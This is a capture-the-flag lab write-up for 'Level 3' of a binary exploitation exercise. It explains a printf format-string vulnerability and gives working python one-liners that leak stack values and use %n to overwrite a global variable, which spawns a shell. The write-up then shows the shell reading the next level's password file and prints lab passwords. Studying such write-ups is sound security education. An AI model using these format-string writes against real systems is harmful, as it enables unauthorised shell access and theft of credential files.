# Level 3
*password : 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02*

## Analyze
```
$ scp -P 4242 level3@192.168.56.108:level3 .
```

```
  if (m == 0x40) {
    fwrite("Wait what?!\n",1,0xc,stdout);
    system("/bin/sh");
  }
```

`0x40` = 64\
`m` address : 0x0804988c

## printf exploit

- overwrite `m` value using printf
- %n: print nothing and put the number of character in a int
- use %n to put 64 in m

```
$ python -c 'print "\x8c\x98\x04\x08 %p %p %p %p %p %p"' | ./level3 
� 0x200 0xb7fd1ac0 0xb7ff37d0 0x804988c 0x20702520 0x25207025
```
address of `m` at parameter 4th.

```
$ python -c 'print "\x8c\x98\x04\x08%60u%4$n"' > /tmp/level3
$ cat /tmp/level3 - | ./level3
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```